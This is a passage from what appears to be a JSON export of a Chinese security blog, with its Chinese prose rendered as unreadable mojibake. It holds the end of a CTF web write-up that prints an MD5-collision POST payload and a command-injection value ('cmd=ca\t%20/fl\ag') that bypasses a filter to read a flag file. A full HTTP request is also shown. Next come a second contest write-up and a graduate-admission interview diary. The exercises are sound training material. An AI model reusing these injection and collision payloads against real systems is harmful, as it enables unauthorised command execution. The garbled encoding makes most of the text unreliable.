&#39;URLENCODE &#39;. urlencode(readmyfile(&quot;1.txt&quot;));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;URLENCODE hash &#39;.md5(urlencode (readmyfile(&quot;1.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;äºŒè¿›åˆ¶hash &#39;.md5( (readmyfile(&quot;2.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;URLENCODE &#39;. urlencode(readmyfile(&quot;2.txt&quot;));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;URLENCODE hash &#39;.md5( urlencode(readmyfile(&quot;2.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;; ä¸‹é¢å°†è¿™ä¸¤ä¸ªMD5å€¼åˆ†åˆ«ç»™POSTçš„aå’Œbèµ‹å€¼ï¼ŒåŒæ—¶URLçš„?cmd=ca\\t%20fl\\ag è¿™é‡Œæˆ‘è¸©äº†ä¸ªå‘ï¼Œä¸€å¼€å§‹æ˜¯GETæ–¹å¼æäº¤è¯·æ±‚ï¼Œç„¶åæ‰‹åŠ¨æ”¹æ–¹æ³•ä¸ºPOSTï¼Œä¸€ç›´ä¸èƒ½æˆåŠŸï¼Œåæ¥å‘ç°å¯èƒ½æ˜¯æŸäº›è¯·æ±‚å¤´çš„é—®é¢˜ï¼Œæˆ‘è¿™é‡Œç”¨hackbarå‘é€POSTè¯·æ±‚ï¼Œè¯·æ±‚ä½“éšä¾¿å†™ï¼Œåœ¨BPé‡Œé¢æŠ“åŒ…ï¼Œå°†è¯·æ±‚ä½“çš„å†…å®¹æ”¹æˆaå’Œbçš„å€¼ï¼Œåœ¨æ­¤ä¹‹åå³å¯æ„‰å¿«åœ°å‘½ä»¤æ‰§è¡Œã€‚ payload: 123a=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC è¯·æ±‚åŒ…: 123456789101112131415POST /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ca\\t%20/fl\\ag HTTP/1.1Host: 31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cnContent-Length: 1029Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cnContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closea=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC å“åº”åŒ…å¦‚ä¸‹å›¾ï¼š æ€»ç»“å¥½ä¹…æ²¡åˆ·webäº†ï¼Œå¤ªèœäº†ï¼Œè¿™é“é¢˜ä¸€å¼€å§‹æ²¡æ€è·¯ï¼Œçœ‹ç€å¸ˆå‚…ä»¬çš„wpå¤ç°å‡ºæ¥çš„ï¼Œè¸©å‘è¸©äº†å¤§æ¦‚ä¸€ä¸ªå°æ—¶ã€‚","categories":[],"tags":[]},{"title":"å±±ä¸œçœç½‘ç»œæŠ€æœ¯å¤§èµ›-ç½‘ç»œå®‰å…¨èµ›é“åˆèµ›ç¬¬äºŒåœºwp","slug":"å±±ä¸œçœç½‘ç»œæŠ€æœ¯å¤§èµ›-ç½‘ç»œå®‰å…¨èµ›é“åˆèµ›ç¬¬äºŒåœºwp","date":"2020-10-19T04:10:22.000Z","updated":"2020-10-19T04:10:38.695Z","comments":true,"path":"2020/10/19/å±±ä¸œçœç½‘ç»œæŠ€æœ¯å¤§èµ›-ç½‘ç»œå®‰å…¨èµ›é“åˆèµ›ç¬¬äºŒåœºwp/","link":"","permalink":"https://polosec.github.io/2020/10/19/%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%88%9D%E8%B5%9B%E7%AC%AC%E4%BA%8C%E5%9C%BAwp/","excerpt":"","text":"å†™åœ¨å‰é¢ç»„å§”ä¼šå¤ªé€†å¤©äº†ï¼Œpwnç¯å¢ƒæŒ‚äº†ï¼Œç¾¤é‡Œæ²¡äººç†çš„ webè¿›å…¥é¦–é¡µæœ‰ä¸ªæç¤ºï¼ŒæŸ¥çœ‹æºç åpsw.php 1234567891011121314151617181920212223242526&lt;?php highlight_file( __FILE__ ); function encode($string,$option=&#x27;encode&#x27;)&#123; if ($option==&#x27;encode&#x27;) &#123; $lenght=strlen($string); for ($x=0;$x&lt;$lenght;$x++) &#123; @$tmp=substr($string,$x,1); $ord=ord($tmp)+10; @$result=$result.chr($ord); &#125; echo $result.&#x27;&lt;/br&gt;&#x27;; &#125;elseif($option==&#x27;decode&#x27;)&#123; &#125; &#125; encode(&#x27;_Y^kdg_k&#x27;,&#x27;decode&#x27;); ?&gt; æŠŠè¿™æ®µä»£ç æ”¾åˆ°æœ¬åœ°ç”¨phpstudyè·‘èµ·æ¥ï¼Œæœ€åè°ƒç”¨æ—¶decodeæ¢æˆencodeï¼Œè·‘å‡ºæ¥ä¸ªå¯†ç ï¼Œä¸ºichunqiuï¼Œè¾“å…¥åˆ°é¦–é¡µå³å¯è·å¾—flag miscä¸€å¼ å›¾ç‰‡ï¼Œç›´æ¥stegsolve å¾€å³ç‚¹ï¼Œæœ‰ä¸€å¼ äºŒç»´ç  æ‰«ä¸‹æ¥base32è§£å¯†å³å¯å¾—åˆ°flagã€‚","categories":[],"tags":[]},{"title":"ç½‘ç»œå®‰å…¨ä¸“ä¸š-å¤ä»¤è¥/é¢„æ¨å…é¢ç»","slug":"é¢ç»","date":"2020-10-11T16:34:55.000Z","updated":"2021-01-26T10:02:17.684Z","comments":true,"path":"2020/10/12/é¢ç»/","link":"","permalink":"https://polosec.github.io/2020/10/12/%E9%9D%A2%E7%BB%8F/","excerpt":"","text":"å†™åœ¨å‰é¢ç°åœ¨æ˜¯2020å¹´10æœˆ12æ—¥ä¸‹åˆ18ç‚¹19åˆ†ï¼Œæˆ‘äºä»Šå¤©ä¸Šåˆæ”¶åˆ°äº†æ¥è‡ªç”µå­ç§‘æŠ€å¤§å­¦çš„å½•å–é€šçŸ¥ï¼Œç¡®å®šåï¼Œæ„å‘³ç€ä¿ç ”ä¹‹æ—…æ­£å¼ç»“æŸã€‚ åœ¨è¿™é•¿è¾¾ä¸€å¹´çš„å‡†å¤‡æ—¶é—´é‡Œï¼Œæ„Ÿè°¢çˆ¶æ¯ã€å®¶äººã€å­¦æ ¡ã€å­¦é™¢å¯¹æˆ‘çš„æ”¯æŒï¼Œæ„Ÿè°¢ä¿ç ”å‰è¾ˆå¯¹æˆ‘çš„æŒ‡ç‚¹ï¼Œæ„Ÿè°¢æœ‹å‹ä»¬ä¸ºæˆ‘æä¾›ä¿¡æ¯ï¼ŒåŠ æ²¹é¼“åŠ²ã€‚ å¤ä»¤è¥å’Œé¢„æ¨å…æƒ…å†µå¤ä»¤è¥ç”³è¯·å­¦æ ¡ï¼š30+æ‰€985ï¼Œ211å­¦æ ¡ï¼Œåªæœ‰å±±å¤§ã€ä¸­æµ·æ´‹ã€ä¸­å¤®è´¢ç»ã€å›½é˜²ç§‘å¤§ç”µå­å¯¹æŠ—å­¦é™¢é€šè¿‡äº†åˆå®¡ã€‚ å¤ä»¤è¥é€šè¿‡å­¦æ ¡ï¼šä¸­æµ·æ´‹ä¸“ç¡•ã€å›½é˜²ç§‘å¤§ç”µå­å¯¹æŠ—å­¦é™¢ ç½‘ç»œå®‰å…¨ å­¦ç¡•ï¼Œå…¶ä¸­æ‹’ç»äº†ä¸­å¤®è´¢ç»çš„é¢è¯•ã€‚ é¢„æ¨å…ç”³è¯·å­¦æ ¡ï¼šå±±å¤§ã€å¤©å¤§ã€ç”µå­ç§‘å¤§ã€è¥¿åŒ—å·¥ä¸šå¤§å­¦ã€å“ˆå·¥å¤§ã€å¤æ—¦ã€è¥¿ç”µç­‰ã€‚ é¢„æ¨å…é€šè¿‡å­¦æ ¡ï¼šå±±å¤§ç½‘å®‰å­¦ç¡•ã€å¤©å¤§ç½‘å®‰å­¦ç¡•ã€ç”µå­ç§‘å¤§ç½‘å®‰å­¦ç¡•ï¼ˆå…¶ä¸­æ‹’ç»äº†è¥¿åŒ—å·¥å¤§ã€è¥¿ç”µé¢è¯•ï¼‰ æœ€ç»ˆå»å‘ï¼šç”µå­ç§‘æŠ€å¤§å­¦-è®¡ç®—æœºå­¦é™¢-ç½‘ç»œç©ºé—´å®‰å…¨-å­¦ç¡• ï¼Œå¼ å°æ¾æ•™æˆå›¢é˜Ÿ ï¼Œç ”ç©¶æ–¹å‘ï¼šäº‘è®¡ç®—ä¸IOTå®‰å…¨ã€‚ ä¸ªäººæƒ…å†µä»‹ç»èƒŒæ™¯ç®€è¿°GPA:4.1/5.0ï¼ˆä¸“ä¸š1/49ï¼‰; CET-4:540; CET-6:548; ä¸€ç¯‡å›½å®¶çº§æ™®åˆŠï¼Œç¾èµ›ä¸€ç­‰å¥–ï¼Œè“æ¡¥æ¯çœäºŒï¼Œä¸¤æ¬¡æ ¡ä¸€ç­‰å¥–å­¦é‡‘ã€å±±ä¸œçœæ”¿åºœå¥–å­¦é‡‘ã€æ•°æ¬¡CTFç«èµ›ç»å†ã€‚ ä¸€æ®µä¸“ä¸šçŸ­æœŸå®ä¹ ç»å†ï¼Œä¸¤ä¸ªå°é¡¹ç›®ã€‚ï¼ˆå…¨éƒ¨ä¸“ä¸šé«˜åº¦ç›¸å…³ï¼‰ è¯¦ç»†ä»‹ç»æˆ‘æ¥è‡ªå±±ä¸œçœä¸€æ‰€ä¸€æœ¬å­¦æ ¡â€”â€”æ›²é˜œå¸ˆèŒƒå¤§å­¦ï¼Œæœ¬ç§‘èƒŒæ™¯é€šä¿—åœ°è®²å«åšâ€œåŒéâ€ã€‚ æˆ‘è‡ªåˆä¸­èµ·å¯¹ç½‘ç»œå®‰å…¨æŠ€æœ¯æ„Ÿå…´è¶£ï¼Œä¸€ç›´åœ¨æ–­æ–­ç»­ç»­åœ°æ‘¸ç´¢ï¼Œå¤§å­¦é€‰æ‹©äº†è½¯ä»¶å·¥ç¨‹ä¸“ä¸šï¼Œç®—æ˜¯æ­£å¼è¿›å…¥è®¡ç®—æœºè¡Œä¸šç§‘ç­ã€‚ å¤§ä¸€æ²¡æœ‰ç‰¹åˆ«è®¤çœŸå­¦ä¹ ï¼ŒGPAä¸º3.8/5ï¼Œæš‘å‡æœ‰ä¸€æ®µé¦™æ¸¯è®¿å­¦ç»å†ï¼Œæ— æ ¡çº§ä»¥ä¸Šå¥–é¡¹ã€‚ å¤§ä¸€ä»é¦™æ¸¯å›æ¥åï¼ŒåŠ±å¿—å»æ¸¯æ ¡ï¼Œç»å’¨è¯¢åGPAå¯¹æˆ‘æ¥è¯´è‡³å°‘è¦4ä»¥ä¸Šï¼Œäºæ˜¯å¤§äºŒå¼€å§‹æ¯å¤©è®¤çœŸå­¦ä¹ ä¸“ä¸šçŸ¥è¯†ï¼Œæ³¡è‡ªä¹ å®¤ã€‚å¤§äºŒé€šè¿‡äº†å››å…­çº§è€ƒè¯•ï¼Œå››çº§540ï¼Œå…­çº§ç¬¬ä¸€æ¬¡501ã€‚æ‹¿åˆ°äº†è“æ¡¥æ¯ç¼–ç¨‹å±±ä¸œçœäºŒç­‰å¥–ï¼ˆæ°´ï¼‰ï¼Œéšå¸ˆå“¥å»å¤–çœå‚åŠ äº†ä¸¤æ¬¡CTFçº¿ä¸‹èµ›ï¼ˆåˆ’æ°´ï¼‰ï¼Œæ²¡ä»€ä¹ˆæˆç»©ã€‚å¤§äºŒæœ€ç»ˆGPAä¸º4.01ï¼Œå¤§äºŒå­¦å¹´GPAä¸º4.32ï¼Œå…¨å¹´çº§æœ€é«˜ã€‚ å¤§ä¸‰åœ¨å¸ˆå“¥çš„å»ºè®®ä¸‹å†³å®šå°è¯•ä¿ç ”ï¼Œäºæ˜¯å¼€å§‹ä»å…¬ä¼—å·äº†è§£ç›¸å…³æ”¿ç­–ä¿¡æ¯ï¼Œä¸€å¼€å§‹ä¹Ÿæ˜¯æ‡µæ‡‚æ— çŸ¥çš„çŠ¶æ€ï¼ŒçŸ¥é“äº†éœ€è¦å‡†å¤‡ç®€å†ã€é¡¹ç›®ã€ç«èµ›ã€è®ºæ–‡ã€å››å…­çº§ã€‚ ä¿ç ”å‡†å¤‡å¤§ä¸‰ä¸Šå­¦æœŸé€šè¿‡äº†å…­çº§è€ƒè¯•ï¼Œåœ¨ä¸¥æ ¼çš„æ¨¡æ‹Ÿè®­ç»ƒä¸‹æ‹¿åˆ°äº†548åˆ†ï¼Œè¿˜ç®—æ»¡æ„ã€‚ç”±äºç–«æƒ…åŸå› åœ¨å®¶è€½è¯¯äº†ä¸€æ®µæ—¶é—´ï¼Œè¿‡å¹´é‚£æ®µæ—¶é—´ä¸»è¦åœ¨å®¶å­¦ä¿ç ”è¯¾ï¼Œäº†è§£å¦‚ä½•å†™ä¸ªäººç®€å†ã€è‡ªæˆ‘ä»‹ç»ã€è‡ªæˆ‘é™ˆè¿°ã€å­¦æ ¡ç”³è¯·ç­‰ç›¸å…³æµç¨‹ã€‚ 2020å¹´2æœˆä»½ä¸ä¸¤ä½æ•°å­¦çš„é˜Ÿå‹ä¸€èµ·å‚åŠ äº†ç¾å›½å¤§å­¦ç”Ÿæ•°å­¦å»ºæ¨¡ç«èµ›ï¼Œæˆ‘åŸºæœ¬è´Ÿè´£é™¤äº†å†™è®ºæ–‡å’Œå»ºæ¨¡å¤–çš„å…¶ä»–å†…å®¹ã€‚ï¼ˆæˆ‘æ˜¯è¾…åŠ©ï¼‰ï¼Œæœ€ç»ˆæ‹¿äº†å›½é™…ä¸€ç­‰å¥–çš„æˆç»©ï¼Œè¿™ä¸æˆ‘ä¸¤ä½é˜Ÿå‹çš„åŠªåŠ›æ˜¯åˆ†ä¸å¼€çš„ï¼Œè‡´è°¢ã€‚ 2020å¹´2æœˆä»½å¤§è‡´å‡†å¤‡å¥½äº†ç®€å†ã€è‡ªæˆ‘ä»‹ç»ï¼ˆä¸­è‹±æ–‡ï¼Œé•¿çŸ­å„ä¸€ä»½ï¼Œå…±å››ä»½ï¼‰ã€ä¸ªäººé™ˆè¿°ã€æ¨èä¿¡ã€è¯ä¹¦è¯ä»¶æ‰«æç­‰æ–‡ä¹¦å·¥ä½œã€‚ç®€å†çš„å®Œå–„å·¥ä½œä¸€ç›´åˆ°æœ€åä¸€æ¬¡é¢è¯•å‰ï¼Œçº¦å››äº”åæ¬¡å¤§å¤§å°å°çš„ä¿®æ”¹å§ã€‚ 2020å¹´ä¸‰æœˆä»½æˆåŠŸæŠ•ç¨¿äº†æˆ‘åœ¨ä¸€æœˆä»½å¼€å§‹å†™çš„ä¸€ç¯‡æœŸåˆŠï¼ŒæŠ•ç¨¿è‡³å›½å®¶çº§æ™®åˆŠï¼ŒæœŸé—´å­¦ä¹ äº†å¾ˆå¤šçŸ¥è¯†ã€‚ 2020å¹´ä¸‰æœˆå¼€å§‹æ­£å¼æ‰“CTFã€å­¦ä¹ CTFçŸ¥è¯†ï¼Œå†™åšå®¢ã€‚ 2020å¹´4æœˆå®Œæˆäº†åŸºäºflaskæ¡†æ¶çš„å›¾ä¹¦ç®¡ç†ç³»ç»Ÿï¼ˆä¸€ä¸ªå¾ˆå°çš„é¡¹ç›®ï¼Œæ€»å…±å°±å››äº”ç™¾è¡Œä»£ç ï¼‰å››æœˆä»½å¼€å§‹äº†è§£ä¸“ä¸šå‰æ™¯ï¼Œå‘å„ä½å‰è¾ˆä»¥åŠçŸ¥ä¹ã€äº¤æµç¾¤é‡Œæ‰“å¬ä¸“ä¸šå¼ºæ ¡ã€å¼ºè€å¸ˆã€‚ 2020å¹´5æœˆå®Œæˆäº†åŸºäºNmapå’ŒMasscanæ‰«æå™¨çš„Webæ‰«æå™¨ï¼Œå¹¶æ”¹è¿›äº†CTF-wscanæ‰«æå™¨ï¼ˆä¸»è¦æ˜¯ä¼˜åŒ–äº†å¤šçº¿ç¨‹ä¸é‡å¤æ‰«æé—®é¢˜ï¼Œå½“ç„¶ç›®å‰è¿˜å­˜åœ¨ä¸€äº›bugï¼‰ã€‚äº”æœˆä»½å¼€å§‹è”ç³»å¯¼å¸ˆï¼Œå…¶ä¸­æœ‰ä¸€ä½å—æ–¹å­¦æ ¡çš„è€å¸ˆä¸ºæˆ‘æä¾›äº†ä¸€æ¬¡å®è´µçš„å®ä¹ æœºä¼šã€‚åœ¨æ­¤å‘é­è€å¸ˆè‡´è°¢ã€‚ 2020å¹´6æœˆåœ¨è€å¸ˆçš„æ¨èä¸‹èµ´å¹¿å·è¿›è¡Œå®ä¹ ï¼ŒèŒä½æ˜¯æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆã€‚ä¸¤ä¸ªæœˆçš„å®ä¹ æœŸé—´ä¸»è¦æ˜¯å­¦ä¼šäº†ä¸€äº›æ€è·¯ä¸å·¥å…·ï¼Œæ”¶è·äº†ä¸€äº›å¥½å‹ä¸äººè„‰ã€‚æœŸé—´ä¹Ÿåœ¨ä¸æ–­åœ°æŠ•é€’ç®€å†ä¸è”ç³»è€å¸ˆã€‚å…­æœˆåº•é€šè¿‡äº†ä¸­æµ·æ´‹ã€å±±å¤§çš„åˆå®¡ã€‚ 2020å¹´7æœˆæ‹¿åˆ°äº†ä¸­æµ·æ´‹ä¼˜è¥ï¼Œå›½é˜²ç§‘å¤§ç”µå­å¯¹æŠ—å­¦é™¢å½•å–èŒƒå›´ç¬¬äºŒåï¼Œå‚åŠ ç”µå­ç§‘æŠ€å¤§å­¦å¯¼å¸ˆå›¢é˜Ÿé¢è¯•å¹¶é€šè¿‡ï¼Œä¸æ­¤åŒæ—¶ç»§ç»­å®ä¹ ã€‚ 2020å¹´8æœˆé€šè¿‡äº†æ·±ä¿¡æœåŒ—äº¬å®‰å…¨ç ”å‘ä¸­å¿ƒå®ä¹ ç”Ÿä¸¤è½®æŠ€æœ¯é¢ï¼Œå› å­¦æ ¡æ—¶é—´å†²çªåŸå› æ”¾å¼ƒhré¢ã€‚ 2020å¹´9æœˆé€šè¿‡åŒ—äº¬hwè“é˜Ÿé¢è¯•ï¼Œè–ªèµ„æ˜¯æœ€ä½çš„1.3kä¸€å¤©åŒ…åƒä½ï¼ˆå½©ç¬”ï¼‰ã€é€šè¿‡äº†å¤©å¤§å¤è¯•ï¼Œæ‹¿åˆ°äº†å­¦ç¡•offer 2020å¹´10æœˆé€šè¿‡ç”µå­ç§‘å¤§ã€å±±å¤§å¤è¯•ï¼Œæ‹¿åˆ°æœ¬æ ¡æ¨å…èµ„æ ¼ï¼Œæ‹¿åˆ°å­¦ç¡•offerå¹¶ä¸Šå²¸ã€‚ åŠå‘Šä¿ç ”æ˜¯ä¸€åœºä¿¡æ¯æˆ˜ï¼Œä½†è¦å­¦ä¼šå¦‚ä½•è·å–æœ‰ç”¨ã€æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œå­¦ä¼šäº¤æœ‹å‹ï¼Œæœ‰æ—¶å€™å¤–æ ¡æœ‹å‹çš„ä¿¡æ¯èƒ½å†³å®šä½ çš„å‘½è¿ è”ç³»è€å¸ˆå¾ˆé‡è¦ï¼Œä½ ä¼šå‘ç°æˆ‘æ‰€æœ‰å…¥è¥ä¸”æ‹¿åˆ°offerçš„å­¦æ ¡éƒ½æå‰è”ç³»äº†è€å¸ˆã€‚ å¤ä»¤è¥é¢ç»ç”±äºå¤ä»¤è¥éƒ½åœ¨å·ï¼Œå…¥è¥éå¸¸å°‘ï¼Œå±±å¤§æ˜¯æŠ¥åçš„å…¨å…¥è¥äº†ï¼Œæ²¡æœ‰å‚è€ƒä»·å€¼ã€‚ ä¸‹é¢æŒ‰ç…§æ—¶é—´é¡ºåºæ¥è¯´ ä¸­å›½æµ·æ´‹å¤§å­¦ ä¿¡æ¯å­¦é™¢ä¸­æµ·æ´‹ç¬¬ä¸€ä¸ªé¢è¯•ï¼Œæˆ‘æå‰è”ç³»äº†è€å¸ˆï¼Œè€å¸ˆäººå¾ˆå¥½ï¼Œåœ¨ä¿¡æ¯å­¦é™¢åšå®‰å…¨ç®—æ˜¯æ¯”è¾ƒå¥½çš„è€å¸ˆäº†ï¼Œé‚®ä»¶è”ç³»åï¼Œæ­£å¥½è€å¸ˆè´Ÿè´£å¤ä»¤è¥å®¡æ‰¹ï¼Œç»™äº†æˆ‘å…¥è¥èµ„æ ¼ã€‚ä»Šå¹´ä¸­æµ·æ´‹è®¡ç®—æœºå¤ä»¤è¥åˆå®¡æŠ¥äº†å››ç™¾å¤šï¼Œå¯æƒ³è€ŒçŸ¥ã€‚ åœ¨å…¥è¥åæœ‰ä¸€ä¸ªçƒ­èº«æ´»åŠ¨ï¼Œé€‰å®šä¸€ä¸ªæ–¹å‘ä»¥åŠé—®é¢˜ï¼Œå¯¹è¿™ä¸ªé—®é¢˜å±•å¼€ç ”ç©¶å¹¶å†™è®ºæ–‡å’Œpptå½•å±äº”åˆ†é’Ÿå†…æ±‡æŠ¥ã€‚æˆ‘é€‰çš„æ˜¯ç³»ç»Ÿå®‰å…¨çš„é—®é¢˜ï¼Œmeltdownï¼Œé˜²å¾¡æ–¹æ³•æœ‰KASLRç­‰ã€‚ é¢è¯•å‰ä¸€æ™šæœ‰ä¸ªæœºè¯•ï¼Œæ®è¯´æœºè¯•ä¸ç®—æˆç»©é‡Œé¢ï¼Œä½†æ˜¯é¢è¯•å®˜ä¼šæœ‰æœºè¯•çš„æˆç»©ã€‚å¤§æ¦‚é¢˜ç›®éƒ½æ˜¯äº›æ¯”è¾ƒç®€å•çš„æ ¼å¼è¾“å…¥è¾“å‡ºï¼Œç®—å¹³å‡åˆ†ä¹‹ç±»çš„ï¼Œæœ€åä¸€ä¸ªæ˜¯ç±»ä¼¼çŸ©é˜µè½¬ç½®è¾“å‡ºã€‚ã€‚æ²¡å†™ä¸Šæ¥è‰ã€‚ é¢è¯•å¤§æ¦‚æ˜¯ä¸Šæ¥å…ˆæŠ½é¢˜ æˆ‘æŠ½åˆ°äº†ç®€è¿°è®¡ç®—æœºç½‘ç»œOSIä¸ƒå±‚æ¨¡å‹ï¼Œç„¶åå°±æ˜¯è€å¸ˆæé—®ï¼Œé—®æˆ‘æé™ç¼–ç¨‹çš„æ¦‚å¿µã€‚ã€‚ã€‚ä¸ä¼šï¼›é—®æˆ‘MIPSäº†è§£å¤šå°‘ã€‚ã€‚ã€‚ä¸ä¼šï¼›é—®æˆ‘ACID ï¼Œè¯´äº†AIDå¿˜äº†Cçš„å«ä¹‰æ˜¯å•¥äº†ã€‚ã€‚ã€‚å°´å°¬ï¼›æœ€åç­‰äº†ä¸€å‘¨ç»™äº†ä¸“ç¡•ã€‚ å±±ä¸œå¤§å­¦ ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢SDUç½‘å®‰æ˜¯æˆ‘æ¯”è¾ƒæƒ³å»çš„ä¸€ä¸ªå­¦æ ¡ï¼Œæœ‰æƒ³è·Ÿçš„è€å¸ˆï¼Œå¯æƒœé‚£ä½è€å¸ˆä¸è¦æˆ‘ï¼Œå½“ç„¶ï¼Œè¿˜æœ‰ä¸€ä½æƒ³è·Ÿçš„è€å¸ˆï¼Œé‚£ä½è€å¸ˆäººå¾ˆå¥½ï¼Œæˆ‘ä¹Ÿæå‰å’Œä»–è”ç³»äº†ã€‚ å¤ä»¤è¥å±±å¤§ç½‘å®‰é¢è¯•120ä¸ªäººæ”¶17ä¸ªä¼˜è¥ï¼ŒåŒ…æ‹¬6ä¸ªå·¦å³çš„æœ¬æ ¡.. é¢è¯•å½“å¤©é—®æˆ‘å¯¹å¯†ç å­¦æœ‰å¤šå°‘äº†è§£ï¼Œæˆ‘è¯´äº†è§£è¿‡å¯¹ç§°ã€éå¯¹ç§°åŠ å¯†ï¼Œåœ¨èšå‰‘åŠ å¯†æµé‡åˆ†æä¸­ç”¨è¿‡ã€‚ç„¶åé—®æˆ‘äº†è§£è¿‡å“ªäº›ç³»ç»Ÿå®‰å…¨æ–¹é¢çš„æ¼æ´ï¼Œæˆ‘è¯´meltdownï¼Œæˆ‘è¯´æœ¬ç§‘ä¸»è¦æ˜¯åšwebæ–¹å‘ï¼Œè€å¸ˆè¯´å¸Œæœ›æˆ‘ä»¥åå¤šäº†è§£ç³»ç»Ÿå®‰å…¨çš„çŸ¥è¯†ã€‚ï¼ˆå…¶ä»–ç»†èŠ‚è®°ä¸å¤ªæ¸…äº† å¤ä»¤è¥å°è±¡ä¸æ˜¯å¤ªæ·±åˆ»ï¼‰ æœ€åä¼˜è¥å½“ç„¶æ²¡æˆ‘å•¥äº‹ å›½é˜²ç§‘æŠ€å¤§å­¦ ç”µå­å¯¹æŠ—å­¦é™¢NUDTç”µæŠ—æˆ‘å…ˆè”ç³»äº†ä¸€ä½æ•™æˆï¼Œå¦‚æ²æ˜¥é£çš„æ„Ÿè§‰ï¼Œç»™äººä¸€ç§å’Œè”¼å¯äº²çš„æ„Ÿè§‰ï¼Œåœ¨å’Œåœ°æ–¹ç”Ÿå­¦é•¿äº¤æµçš„æ—¶å€™å¾—çŸ¥è¯¥è€å¸ˆæ°´å¹³å¾ˆé«˜ï¼Œè¦æ±‚ä¸¥æ ¼ï¼Œä¸ç¼ºå­¦ç”Ÿï¼Œæˆ‘ä¹Ÿå¾ˆè£å¹¸ä»–èƒ½ç›¸ä¸­æˆ‘ã€‚ åœ¨é¢è¯•çš„æ—¶å€™è®¾å¤‡é—®é¢˜ï¼Œä¸€ç›´å±å±å•¦å•¦å¯¹é¢å¬ä¸æ¸…ï¼Œè¿›è¡Œè‹±æ–‡è‡ªæˆ‘ä»‹ç»çš„æ—¶å€™è¢«è¿«å«åœã€‚åé¢ç®€å•é—®äº†é—®é¡¹ç›®ã€å®ä¹ 